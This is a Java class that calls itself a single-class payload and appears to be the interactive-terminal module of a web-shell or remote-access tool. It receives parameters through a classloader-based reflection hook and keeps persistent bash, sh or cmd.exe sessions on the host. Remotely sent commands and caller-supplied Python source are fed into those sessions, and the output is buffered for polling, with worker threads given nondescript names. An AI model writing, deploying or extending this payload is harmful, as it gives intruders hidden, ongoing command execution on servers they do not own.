package org.leo.core.component;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.nio.charset.Charset;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * Persistent interactive terminal component.
 *
 * Pipe shells are the default. Unix Python PTY is explicitly selected at
 * initialization and forwards raw bytes through Python's pty.spawn.
 *
 * Java 6 single-class payload: no lambdas, inner classes or Java 7+ APIs.
 */
public class ExecCommandComponent implements Runnable {

    private static final int OP_WRITE = 0;
    private static final int OP_READ = 1;
    private static final int OP_STOP = 2;
    private static final int OP_RESIZE = 3;
    private static final int OP_WRITE_LINE = 4;
    private static final int OP_READ_BATCH = 5;
    private static final int OP_INIT = 6;
    private static final int MAX_BATCH_SIZE = 16;
    private static final int OUTPUT_CHUNK_BYTES = 64 * 1024;

    private static final int BUFFER_SIZE = 1024;
    private static final int MAX_INPUT_BYTES = 1024 * 1024;
    private static final int MAX_OUTPUT_BYTES = 10 * 1024 * 1024;
    private static final int MAX_PROCESS_COUNT = 32;
    private static final long IDLE_TIMEOUT_MS = 30L * 60L * 1000L;
    private static final long START_TIMEOUT_MS = 2500L;
    private static final long STOP_WAIT_MS = 750L;
    private static final long BACKEND_PROBE_MS = 300L;
    private static final int MAX_READ_WAIT_MS = 10000;

    private static final String KEY_LAST_ACCESS_TIME = "lastAccessTime";
    private static final String KEY_BACKEND = "backend";
    private static final String KEY_PTY = "pty";
    private static final String KEY_RESIZABLE = "resizable";
    private static final String KEY_TERMINAL_MODE = "terminalMode";
    private static final String KEY_INSTANCE_ID = "instanceId";
    private static final String KEY_LONG_POLLING = "longPolling";

    private static final ConcurrentHashMap<String, Map<String, Object>> env =
            new ConcurrentHashMap<String, Map<String, Object>>();
    private static final Charset UTF8 = Charset.forName("UTF-8");
    private static final String INSTANCE_ID = UUID.randomUUID().toString();
    private static final AtomicInteger THREAD_SEQUENCE = new AtomicInteger();
    private static boolean cleanupRunning;

    private final Map<String, Object> processState;
    private final boolean cleanupTask;
    private HashMap<String, Object> params;
    private HashMap<String, Object> results;

    public ExecCommandComponent() {
        this(null, false);
    }

    private ExecCommandComponent(Map<String, Object> state, boolean cleanup) {
        processState = state;
        cleanupTask = cleanup;
    }

    // Runtime entry points: RPC invocation, output pump and idle reaper.
    public void run() {
        if (cleanupTask) {
            runCleanup();
            return;
        }
        if (processState != null) {
            runProcess(processState);
            return;
        }

        java.lang.reflect.InvocationHandler handler =
                (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
        try {
            params = (HashMap) handler.invoke(null, null, null);
            results = new HashMap<String, Object>();
            execCommand();
        } catch (Throwable error) {
            if (results == null) results = new HashMap<String, Object>();
            results.put("code", Integer.valueOf(500));
            results.put("msg", error.getMessage() != null ? error.getMessage() : error.getClass().getName());
        }
        try {
            handler.invoke(null, null, new Object[]{results});
        } catch (Throwable ignored) {
        }
    }

    private void runProcess(Map<String, Object> processMap) {
        Process process = null;
        try {
            process = openProcess(processMap);
            processMap.put("process", process);
            processMap.put("stdin", process.getOutputStream());
            notifyStateChange(processMap);

            if (Boolean.TRUE.equals(processMap.get("stopped"))) {
                terminateProcessTree(process);
                return;
            }

            InputStreamReader reader = new InputStreamReader(process.getInputStream(), detectCharset());
            char[] buffer = new char[BUFFER_SIZE];
            int length;
            while ((length = reader.read(buffer)) != -1) {
                appendOutput(processMap, new String(buffer, 0, length).getBytes(UTF8));
            }
        } catch (Throwable error) {
            processMap.put("error", error.getMessage() != null ? error.getMessage() : error.getClass().getName());
            terminateProcessTree(process);
        } finally {
            closeProcessStreams(process);
            processMap.put("exited", Boolean.TRUE);
            notifyStateChange(processMap);
        }
    }

    // Protocol dispatch and process lifecycle.
    private void execCommand() throws Exception {
        int operation = validateRequest();
        String requestedMode = getTextParam(KEY_TERMINAL_MODE);
        results.put("code", Integer.valueOf(200));
        results.put(KEY_INSTANCE_ID, INSTANCE_ID);
        if (operation == OP_READ_BATCH) {
            readBatch();
            return;
        }
        String processId = getUtf8Param("processId");
        if (processId.length() > 128 || !processId.matches("[A-Za-z0-9._-]+")) {
            throw new IllegalArgumentException("invalid processId");
        }
        cleanupExpiredProcesses();

        Map<String, Object> processMap = env.get(processId);
        if (processMap == null) {
            if (operation != OP_INIT) {
                writeMissingProcessResult(operation);
                return;
            }
            processMap = startProcess(processId, requestedMode == null ? "pipe" : requestedMode);
        }

        if (requestedMode != null && !requestedMode.equals(processMap.get(KEY_TERMINAL_MODE))) {
            throw new IllegalStateException("terminal mode cannot change; create a new terminal");
        }
        touchProcess(processMap);
        switch (operation) {
            case OP_INIT:
                initializeProcess(processId, processMap);
                break;
            case OP_WRITE:
            case OP_WRITE_LINE:
                waitForProcessReady(processMap);
                results.put("written", Integer.valueOf(writeCommand(processMap, operation == OP_WRITE_LINE)));
                writeTerminalMetadata(processMap, results);
                results.put("alive", Boolean.valueOf(isProcessAlive((Process) processMap.get("process"))));
                break;
            case OP_READ:
                waitForReadableOutput(processMap, (int) Math.min(MAX_READ_WAIT_MS, getIntegerParam("waitMs", 0)));
                readOutput(processMap, Integer.MAX_VALUE, results);
                break;
            case OP_RESIZE:
                resizeTerminal(processMap);
                break;
            case OP_STOP:
                destroyProcess(processId, processMap);
                results.put("alive", Boolean.FALSE);
                results.put("stopped", Boolean.TRUE);
                break;
        }
        if (Boolean.TRUE.equals(params.get("includeOutput"))) results.put("output", readOutputResponse(processMap));
    }

    /** Validate before creating a process or consuming buffered output. */
    private int validateRequest() {
        long operationValue = getIntegerParam("op", -1);
        if (operationValue < OP_WRITE || operationValue > OP_INIT) {
            throw new IllegalArgumentException("Invalid op: " + operationValue);
        }
        int operation = (int) operationValue;
        Object includeOutput = params.get("includeOutput");
        if (includeOutput != null && !(includeOutput instanceof Boolean)) {
            throw new IllegalArgumentException("includeOutput must be a boolean");
        }
        if (Boolean.TRUE.equals(includeOutput) && operation != OP_INIT
                && operation != OP_WRITE && operation != OP_WRITE_LINE) {
            throw new IllegalArgumentException("output can only accompany initialization or input");
        }
        long waitMillis = getIntegerParam("waitMs", 0);
        if (waitMillis < 0 || (params.containsKey("waitMs") && operation != OP_READ)) {
            throw new IllegalArgumentException("waitMs must be nonnegative and is only accepted on read");
        }
        String requestedMode = getTextParam(KEY_TERMINAL_MODE);
        if (requestedMode != null) {
            if (!"pipe".equals(requestedMode) && !"python-pty".equals(requestedMode)) {
                throw new IllegalArgumentException("unsupported terminal mode: " + requestedMode);
            }
            if (operation != OP_INIT) {
                throw new IllegalArgumentException("terminal mode is only accepted during initialization");
            }
        }
        if (params.containsKey("ptyBridge")) {
            getBytesParam("ptyBridge");
            if (operation != OP_INIT || !"python-pty".equals(requestedMode)) {
                throw new IllegalArgumentException("ptyBridge is only accepted during Python PTY initialization");
            }
        }
        byte[] command = getBytesParam("cmd");
        if (operation == OP_WRITE || operation == OP_WRITE_LINE || operation == OP_RESIZE) {
            if (command.length == 0 || command.length > MAX_INPUT_BYTES) {
                throw new IllegalArgumentException("cmd must contain 1 to 1048576 bytes");
            }
        } else if (command.length != 0) {
            throw new IllegalArgumentException("cmd is only accepted on input or resize");
        }
        return operation;
    }

    private void initializeProcess(String processId, Map<String, Object> processMap) throws Exception {
        try {
            waitForProcessReady(processMap);
        } catch (Exception error) {
            destroyProcess(processId, processMap);
            throw error;
        }
        writeTerminalMetadata(processMap, results);
        results.put("initialized", Boolean.TRUE);
        results.put("alive", Boolean.valueOf(isProcessAlive((Process) processMap.get("process"))));
    }

    private Map<String, Object> startProcess(String processId, String mode) {
        Map<String, Object> placeholder = new ConcurrentHashMap<String, Object>();
        placeholder.put(KEY_TERMINAL_MODE, mode);
        placeholder.put("output", new ByteArrayOutputStream());
        if ("python-pty".equals(mode)) {
            placeholder.put("ptyBridge", getUtf8Param("ptyBridge"));
        }
        touchProcess(placeholder);
        Map<String, Object> existing;
        synchronized (env) {
            existing = env.get(processId);
            if (existing == null) {
                if (env.size() >= MAX_PROCESS_COUNT) {
                    throw new IllegalStateException("too many active terminal processes, max=" + MAX_PROCESS_COUNT);
                }
                env.put(processId, placeholder);
            }
        }
        if (existing != null) return existing;

        Object hostId = params.get("hostId");
        try {
            ensureCleanupWorker();
            startWorker(placeholder, workerThreadName(hostId, processId));
        } catch (RuntimeException error) {
            destroyProcess(processId, placeholder);
            throw error;
        }
        return placeholder;
    }

    private void startWorker(Map<String, Object> state, String name) {
        ExecCommandComponent task = new ExecCommandComponent(state, state == null);
        Thread worker = new Thread(task, name);
        worker.setDaemon(true);
        worker.setContextClassLoader(ExecCommandComponent.class.getClassLoader());
        worker.start();
    }

    private void ensureCleanupWorker() {
        synchronized (env) {
            if (cleanupRunning) return;
            cleanupRunning = true;
            try {
                startWorker(null, "terminal-cleanup-" + INSTANCE_ID);
            } catch (RuntimeException error) {
                cleanupRunning = false;
                throw error;
            }
        }
    }

    private void runCleanup() {
        try {
            while (true) {
                synchronized (env) {
                    if (env.isEmpty()) {
                        cleanupRunning = false;
                        return;
                    }
                }
                cleanupExpiredProcesses();
                Thread.sleep(1000L);
            }
        } catch (InterruptedException interrupted) {
            Thread.currentThread().interrupt();
            synchronized (env) { cleanupRunning = false; }
        }
    }

    private void waitForProcessReady(Map<String, Object> processMap) throws Exception {
        long deadline = System.currentTimeMillis() + START_TIMEOUT_MS;
        synchronized (processMap) {
            while (processMap.get("stdin") == null && processMap.get("error") == null
                    && !Boolean.TRUE.equals(processMap.get("exited"))) {
                long remaining = deadline - System.currentTimeMillis();
                if (remaining <= 0) break;
                processMap.wait(remaining);
            }
        }
        if (processMap.get("stdin") == null || Boolean.TRUE.equals(processMap.get("stopped"))
                || Boolean.TRUE.equals(processMap.get("exited"))) {
            Object error = processMap.get("error");
            throw new IllegalStateException(error != null ? String.valueOf(error) : "terminal startup timed out");
        }
    }

    private void notifyStateChange(Map<String, Object> processMap) {
        synchronized (processMap) {
            processMap.notifyAll();
        }
    }

    // Input writes are serialized; output uses its own short-lived buffer lock.
    private int writeCommand(Map<String, Object> processMap, boolean lineInput) throws IOException {
        byte[] command = getBytesParam("cmd");
        OutputStream writer = (OutputStream) processMap.get("stdin");
        if (writer == null) throw new IllegalStateException("terminal stdin is not ready");
        synchronized (writer) {
            if (lineInput) {
                writePipeLines(processMap, writer, command);
            } else if (Boolean.TRUE.equals(processMap.get(KEY_PTY))) {
                writer.write(command);
                writer.flush();
            } else {
                writePipeInput(processMap, writer, command);
            }
        }
        return command.length;
    }

    /** Complete lines already edited and echoed by the client. */
    private void writePipeLines(Map<String, Object> processMap, OutputStream writer, byte[] input) throws IOException {
        if (Boolean.TRUE.equals(processMap.get(KEY_PTY))) {
            throw new IllegalArgumentException("line input requires a pipe terminal");
        }
        if (input.length == 0 || input.length > MAX_INPUT_BYTES || input[input.length - 1] != '\n') {
            throw new IllegalArgumentException("line input must end with LF and be at most 1 MiB");
        }
        writePipeText(writer, new String(input, UTF8));
    }

    private void writePipeText(OutputStream writer, String text) throws IOException {
        String normalized = text.replace("\r\n", "\n").replace('\r', '\n');
        writer.write((isWindows() ? normalized.replace("\n", "\r\n") : normalized).getBytes(detectCharset()));
        writer.flush();
    }

    /** Internal stream callers use node-side PIPE editing and echo. */
    private void writePipeInput(Map<String, Object> processMap, OutputStream writer, byte[] input) throws IOException {
        ByteArrayOutputStream line = (ByteArrayOutputStream) processMap.get("inputLine");
        if (line == null) {
            line = new ByteArrayOutputStream();
            processMap.put("inputLine", line);
        }
        ByteArrayOutputStream echo = new ByteArrayOutputStream();
        boolean skipLf = Boolean.TRUE.equals(processMap.get("skipPipeLf"));
        int escape = processMap.get("pipeEscape") instanceof Integer
                ? ((Integer) processMap.get("pipeEscape")).intValue() : 0;
        for (int index = 0; index < input.length; index++) {
            int value = input[index] & 255;
            if (escape != 0) {
                if (escape == 1 && (value == '[' || value == 'O')) escape = 2;
                else if (value >= 64 && value <= 126) escape = 0;
                continue;
            }
            if (value == 27) { escape = 1; continue; }
            if (value == '\n' && skipLf) { skipLf = false; continue; }
            skipLf = value == '\r';
            if (value == '\r' || value == '\n') {
                echo.write('\r'); echo.write('\n');
                appendOutput(processMap, echo.toByteArray());
                echo.reset();
                writePipeText(writer, new String(line.toByteArray(), UTF8) + "\n");
                line.reset();
            } else if (value == 8 || value == 127) {
                byte[] data = line.toByteArray();
                if (data.length > 0) {
                    int end = data.length - 1;
                    while (end > 0 && (data[end] & 192) == 128) end--;
                    line.reset(); line.write(data, 0, end);
                    echo.write('\b'); echo.write(' '); echo.write('\b');
                }
            } else if (value == 3) {
                line.reset();
                byte[] notice = "^C\r\n[PIPE: input cleared; process signals require PTY]\r\n".getBytes(UTF8);
                echo.write(notice, 0, notice.length);
            } else if (value >= 32 || value == '\t') {
                if (line.size() >= MAX_INPUT_BYTES) throw new IOException("terminal input line exceeds 1 MiB");
                line.write(value); echo.write(value);
            }
        }
        processMap.put("skipPipeLf", Boolean.valueOf(skipLf));
        processMap.put("pipeEscape", Integer.valueOf(escape));
        appendOutput(processMap, echo.toByteArray());
    }

    private void appendOutput(Map<String, Object> processMap, byte[] data) {
        ByteArrayOutputStream output = (ByteArrayOutputStream) processMap.get("output");
        if (output == null || data.length == 0) return;
        synchronized (output) {
            int available = Math.max(0, MAX_OUTPUT_BYTES - output.size());
            output.write(data, 0, Math.min(available, data.length));
            if (data.length > available) processMap.put("outputTruncated", Boolean.TRUE);
        }
        notifyStateChange(processMap);
    }

    private void waitForReadableOutput(Map<String, Object> processMap, int waitMillis) {
        if (waitMillis <= 0 || hasReadableOutput(processMap)) return;
        long deadline = System.currentTimeMillis() + waitMillis;
        synchronized (processMap) {
            while (!hasReadableOutput(processMap)
                    && processMap.get("error") == null
                    && !Boolean.TRUE.equals(processMap.get("exited"))
                    && !Boolean.TRUE.equals(processMap.get("stopped"))) {
                long remaining = deadline - System.currentTimeMillis();
                if (remaining <= 0) break;
                try {
                    processMap.wait(remaining);
                } catch (InterruptedException interrupted) {
                    Thread.currentThread().interrupt();
                    break;
                }
            }
        }
    }

    private boolean hasReadableOutput(Map<String, Object> processMap) {
        ByteArrayOutputStream output = (ByteArrayOutputStream) processMap.get("output");
        if (output == null) return false;
        synchronized (output) {
            return output.size() > 0;
        }
    }

    private void readBatch() {
        String value = getUtf8Param("processIds");
        if (value.length() > MAX_BATCH_SIZE * 129) {
            throw new IllegalArgumentException("invalid processIds");
        }
        String[] ids = value.split("\n", -1);
        if (ids.length > MAX_BATCH_SIZE) throw new IllegalArgumentException("too many terminal reads");
        HashSet<String> unique = new HashSet<String>();
        // Validate the whole batch before consuming any output.
        for (int index = 0; index < ids.length; index++) {
            String id = ids[index];
            if (id.length() > 128 || !id.matches("[A-Za-z0-9._-]+") || !unique.add(id)) {
                throw new IllegalArgumentException("invalid or duplicate processId");
            }
        }
        cleanupExpiredProcesses();
        Map<String, Object> terminals = new HashMap<String, Object>();
        for (int index = 0; index < ids.length; index++) {
            Map<String, Object> state = env.get(ids[index]);
            if (state != null) touchProcess(state);
            terminals.put(ids[index], readOutputResponse(state));
        }
        results.put("terminals", terminals);
    }

    /** Batch items and write attachments have the same size and independent error boundary. */
    private Map<String, Object> readOutputResponse(Map<String, Object> processMap) {
        Map<String, Object> response = new HashMap<String, Object>();
        response.put("code", Integer.valueOf(200));
        response.put(KEY_INSTANCE_ID, INSTANCE_ID);
        try {
            if (processMap == null) writeMissingOutput(response);
            else readOutput(processMap, OUTPUT_CHUNK_BYTES, response);
        } catch (Exception error) {
            // Input may already be accepted. An output failure must not invite a resend.
            response.put("code", Integer.valueOf(500));
            response.put("msg", error.getMessage() != null ? error.getMessage() : error.getClass().getName());
        }
        return response;
    }

    private void readOutput(Map<String, Object> processMap, int limit, Map<String, Object> response) throws IOException {
        synchronized (processMap) {
            ByteArrayOutputStream output = (ByteArrayOutputStream) processMap.get("output");
            byte[] data = new byte[0];
            if (output != null) {
                synchronized (output) {
                    if (Boolean.TRUE.equals(processMap.remove("outputTruncated"))) {
                        output.write("\r\n[terminal output truncated]\r\n".getBytes(UTF8));
                    }
                    data = output.toByteArray();
                    output.reset();
                    if (data.length > limit) {
                        output.write(data, limit, data.length - limit);
                        byte[] chunk = new byte[limit];
                        System.arraycopy(data, 0, chunk, 0, limit);
                        data = chunk;
                    }
                }
            }
            Object previous = processMap.get("outputSequence");
            long sequence = previous instanceof Number ? ((Number) previous).longValue() + 1L : 1L;
            processMap.put("outputSequence", Long.valueOf(sequence));
            response.put("outputSequence", Long.valueOf(sequence));
            response.put("data", data);

            Process process = (Process) processMap.get("process");
            boolean alive = process == null ? !Boolean.TRUE.equals(processMap.get("exited")) : isProcessAlive(process);
            response.put("alive", Boolean.valueOf(alive));
            if (process == null) {
                response.put("starting", Boolean.TRUE);
            } else if (!alive) {
                response.put("exitCode", Integer.valueOf(process.exitValue()));
            }
            Object error = processMap.get("error");
            if (error != null) response.put("error", error);
            boolean drained = Boolean.TRUE.equals(processMap.get("exited"));
            boolean hasMore = hasReadableOutput(processMap);
            response.put("hasMore", Boolean.valueOf(hasMore));
            response.put("eof", Boolean.valueOf(drained && !hasMore));
            writeTerminalMetadata(processMap, response);
        }
    }

    private void resizeTerminal(Map<String, Object> processMap) {
        String[] size = getUtf8Param("cmd").split(",", -1);
        if (size.length != 2) throw new IllegalArgumentException("resize expects cols,rows");
        try {
            int cols = Math.max(20, Math.min(500, Integer.parseInt(size[0].trim())));
            int rows = Math.max(5, Math.min(200, Integer.parseInt(size[1].trim())));
            results.put("cols", Integer.valueOf(cols));
            results.put("rows", Integer.valueOf(rows));
        } catch (NumberFormatException error) {
            throw new IllegalArgumentException("resize expects cols,rows");
        }
        results.put("resized", Boolean.FALSE);
        writeTerminalMetadata(processMap, results);
    }

    // Response metadata and terminal state queries.
    private void writeTerminalMetadata(Map<String, Object> processMap, Map<String, Object> response) {
        response.put(KEY_BACKEND, valueOrDefault(processMap.get(KEY_BACKEND), "starting"));
        response.put(KEY_PTY, Boolean.valueOf(Boolean.TRUE.equals(processMap.get(KEY_PTY))));
        response.put(KEY_RESIZABLE, Boolean.FALSE);
        response.put(KEY_LONG_POLLING, Boolean.TRUE);
        response.put("batchRead", Boolean.TRUE);
        response.put("lineInput", Boolean.valueOf(!Boolean.TRUE.equals(processMap.get(KEY_PTY))));
        response.put(KEY_TERMINAL_MODE, valueOrDefault(processMap.get(KEY_TERMINAL_MODE), "pipe"));
        response.put("terminalModes", isWindows() ? new String[]{"pipe"} : new String[]{"pipe", "python-pty"});
    }

    private Object valueOrDefault(Object value, Object fallback) {
        return value != null ? value : fallback;
    }

    private void writeMissingProcessResult(int operation) {
        if (operation == OP_WRITE || operation == OP_WRITE_LINE || operation == OP_RESIZE) {
            throw new IllegalStateException("terminal session is not initialized; create a new terminal");
        }
        results.put("alive", Boolean.FALSE);
        results.put("missing", Boolean.TRUE);
        if (operation == OP_READ) {
            writeMissingOutput(results);
        }
    }

    private void writeMissingOutput(Map<String, Object> response) {
        response.put("alive", Boolean.FALSE);
        response.put("missing", Boolean.TRUE);
        response.put("eof", Boolean.TRUE);
        response.put("data", new byte[0]);
    }

    private void touchProcess(Map<String, Object> processMap) {
        processMap.put(KEY_LAST_ACCESS_TIME, Long.valueOf(System.currentTimeMillis()));
    }

    // Resource cleanup, including descendants on runtimes that expose ProcessHandle.
    private void cleanupExpiredProcesses() {
        long now = System.currentTimeMillis();
        for (Map.Entry<String, Map<String, Object>> entry : env.entrySet()) {
            Map<String, Object> processMap = entry.getValue();
            Long lastAccess = (Long) processMap.get(KEY_LAST_ACCESS_TIME);
            if (lastAccess != null && now - lastAccess.longValue() > IDLE_TIMEOUT_MS) {
                destroyProcess(entry.getKey(), processMap);
            }
        }
    }

    private void destroyProcess(String processId, Map<String, Object> processMap) {
        processMap.put("stopped", Boolean.TRUE);
        // Kill before closing stdin: a blocked writer may hold the stream lock.
        Process process = (Process) processMap.get("process");
        terminateProcessTree(process);
        OutputStream stdin = (OutputStream) processMap.get("stdin");
        if (stdin != null) {
            try { stdin.close(); } catch (Exception ignored) {}
        }
        env.remove(processId, processMap);
        notifyStateChange(processMap);
    }

    private void terminateProcessTree(Process process) {
        if (process == null) return;
        Object[] descendants = snapshotDescendantProcessHandles(process);
        destroyProcessHandles(descendants, false);
        try { process.destroy(); } catch (Exception ignored) {}
        long deadline = System.currentTimeMillis() + STOP_WAIT_MS;
        while (isProcessAlive(process) && System.currentTimeMillis() < deadline) {
            try { Thread.sleep(25L); } catch (InterruptedException interrupted) {
                Thread.currentThread().interrupt();
                break;
            }
        }
        if (isProcessAlive(process)) destroyProcessForcibly(process);
        destroyProcessHandles(descendants, true);
    }

    private boolean isProcessAlive(Process process) {
        if (process == null) return false;
        try {
            process.exitValue();
            return false;
        } catch (IllegalThreadStateException running) {
            return true;
        }
    }

    /** Reflection keeps ProcessHandle optional on Java 6/7/8. */
    private Object[] snapshotDescendantProcessHandles(Process process) {
        Object stream = null;
        try {
            Object root = Process.class.getMethod("toHandle").invoke(process);
            stream = Class.forName("java.lang.ProcessHandle").getMethod("descendants").invoke(root);
            return (Object[]) Class.forName("java.util.stream.Stream").getMethod("toArray").invoke(stream);
        } catch (Throwable ignored) {
            return new Object[0];
        } finally {
            if (stream != null) {
                try {
                    Class.forName("java.util.stream.BaseStream").getMethod("close").invoke(stream);
                } catch (Throwable ignored) {}
            }
        }
    }

    private void destroyProcessHandles(Object[] handles, boolean forcibly) {
        if (handles.length == 0) return;
        try {
            java.lang.reflect.Method destroy = Class.forName("java.lang.ProcessHandle")
                    .getMethod(forcibly ? "destroyForcibly" : "destroy");
            for (int index = handles.length - 1; index >= 0; index--) {
                try { destroy.invoke(handles[index]); } catch (Throwable ignored) {}
            }
        } catch (Throwable ignored) {}
    }

    private void destroyProcessForcibly(Process process) {
        try {
            Process.class.getMethod("destroyForcibly").invoke(process);
        } catch (Throwable unavailable) {
            try { process.destroy(); } catch (Exception ignored) {}
        }
    }

    // Backend selection and host compatibility.
    private Process openProcess(Map<String, Object> processMap) throws Exception {
        ProcessBuilder builder = createProcessBuilder(processMap);
        builder.redirectErrorStream(true);
        Process process = builder.start();
        try {
            if (waitForBackendReady(process)) return process;
            throw new IOException("terminal startup failed: " + readProcessMessage(process));
        } catch (Exception error) {
            terminateProcessTree(process);
            closeProcessStreams(process);
            throw error;
        }
    }

    private boolean waitForBackendReady(Process process) {
        long deadline = System.currentTimeMillis() + BACKEND_PROBE_MS;
        while (System.currentTimeMillis() < deadline) {
            if (!isProcessAlive(process)) return false;
            try {
                Thread.sleep(25L);
            } catch (InterruptedException interrupted) {
                Thread.currentThread().interrupt();
                return false;
            }
        }
        return isProcessAlive(process);
    }

    private String readProcessMessage(Process process) {
        InputStream input = null;
        try {
            input = process.getInputStream();
            ByteArrayOutputStream output = new ByteArrayOutputStream();
            byte[] buffer = new byte[256];
            while (input.available() > 0 && output.size() < 1024) {
                int length = input.read(buffer, 0, Math.min(buffer.length, 1024 - output.size()));
                if (length <= 0) break;
                output.write(buffer, 0, length);
            }
            String message = new String(output.toByteArray(), detectCharset()).trim();
            return message.length() > 160 ? message.substring(0, 160) : message;
        } catch (Exception ignored) {
            return "process exited during startup";
        }
    }

    private void closeProcessStreams(Process process) {
        if (process == null) return;
        try { process.getInputStream().close(); } catch (Exception ignored) {}
        try { process.getErrorStream().close(); } catch (Exception ignored) {}
        try { process.getOutputStream().close(); } catch (Exception ignored) {}
    }

    private ProcessBuilder createProcessBuilder(Map<String, Object> processMap) throws IOException {
        if ("python-pty".equals(processMap.get(KEY_TERMINAL_MODE))) {
            if (isWindows()) throw new IOException("Python PTY is only supported on Unix hosts");
            String python = findExecutable("python3");
            if (python == null) python = findExecutable("python");
            if (python == null) throw new IOException("Python is unavailable; create a pipe terminal instead");
            String source = (String) processMap.remove("ptyBridge");
            if (source == null || source.length() == 0) throw new IOException("Python PTY bridge is missing");
            setBackend(processMap, new File(python).getName() + "-pty", true);
            ProcessBuilder builder = new ProcessBuilder(new String[]{python, "-u", "-c", source, selectShell()});
            builder.environment().put("TERM", "xterm-256color");
            return builder;
        }
        if (isWindows()) {
            setBackend(processMap, "windows-cmd-pipe", false);
            return new ProcessBuilder(new String[]{selectWindowsShell(), "/Q", "/D"});
        }
        setBackend(processMap, "unix-pipe", false);
        String shell = selectShell();
        // The pipe input buffer owns editing/echo, so disable Bash readline.
        return new File(shell).getName().equals("bash")
                ? new ProcessBuilder(new String[]{shell, "--noediting", "-i"})
                : new ProcessBuilder(new String[]{shell, "-i"});
    }

    private void setBackend(Map<String, Object> processMap, String backend, boolean pty) {
        processMap.put(KEY_BACKEND, backend);
        processMap.put(KEY_PTY, Boolean.valueOf(pty));
    }

    private String findExecutable(String name) {
        String path = System.getenv("PATH");
        String directories = (path == null ? "" : path + File.pathSeparator)
                + "/usr/bin" + File.pathSeparator + "/bin" + File.pathSeparator
                + "/usr/local/bin" + File.pathSeparator + "/opt/homebrew/bin";
        for (String directory : directories.split(File.pathSeparator)) {
            File candidate = new File(directory, name);
            if (candidate.isFile() && candidate.canExecute()) return candidate.getAbsolutePath();
        }
        return null;
    }

    private String selectShell() {
        String[] candidates = {System.getenv("SHELL"), "/bin/bash", "/bin/zsh", "/bin/ksh", "/bin/sh"};
        for (String candidate : candidates) {
            if (candidate == null) continue;
            File file = new File(candidate);
            if (file.isFile() && file.canExecute()) return file.getAbsolutePath();
        }
        return "/bin/sh";
    }

    private String selectWindowsShell() {
        String configured = System.getenv("ComSpec");
        if (configured != null) {
            File file = new File(configured);
            if (file.isFile()) return file.getAbsolutePath();
        }
        String resolved = findExecutable("cmd.exe");
        return resolved != null ? resolved : "cmd.exe";
    }

    private String detectCharset() {
        if (!isWindows()) return "UTF-8";
        String charset = System.getProperty("sun.jnu.encoding");
        if (charset == null || charset.length() == 0) charset = System.getProperty("file.encoding");
        return charset != null && charset.length() > 0 ? charset : "GBK";
    }

    private boolean isWindows() {
        return System.getProperty("os.name", "").toLowerCase().indexOf("windows") >= 0;
    }

    private static String workerThreadName(Object hostId, String processId) {
        String seed = String.valueOf(hostId) + "|" + processId + "|" + INSTANCE_ID;
        return "worker-" + Integer.toHexString(seed.hashCode()) + "-"
                + THREAD_SEQUENCE.incrementAndGet();
    }

    // Text options, UTF-8 byte fields and integers have distinct wire types.
    private String getTextParam(String key) {
        Object value = params.get(key);
        if (value == null) return null;
        if (!(value instanceof String)) throw new IllegalArgumentException(key + " must be a string");
        return (String) value;
    }

    private String getUtf8Param(String key) {
        return new String(getBytesParam(key), UTF8);
    }

    private byte[] getBytesParam(String key) {
        Object value = params.get(key);
        if (value == null) return new byte[0];
        if (!(value instanceof byte[])) throw new IllegalArgumentException(key + " must be bytes");
        return (byte[]) value;
    }

    private long getIntegerParam(String key, long defaultValue) {
        Object value = params.get(key);
        if (value == null) return defaultValue;
        if (!(value instanceof Integer) && !(value instanceof Long)) {
            throw new IllegalArgumentException(key + " must be an integer");
        }
        return ((Number) value).longValue();
    }
}
